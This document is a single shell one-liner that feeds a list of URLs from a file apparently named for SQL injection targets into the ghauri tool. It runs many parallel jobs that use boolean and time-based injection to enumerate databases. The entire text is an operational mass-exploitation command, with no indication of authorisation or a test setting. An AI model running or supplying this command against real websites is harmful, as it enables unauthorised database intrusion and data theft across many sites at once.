cat sqli_part02.txt | rush -k -j 20 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 80 --level 5 --fresh-queries --technique BT"'
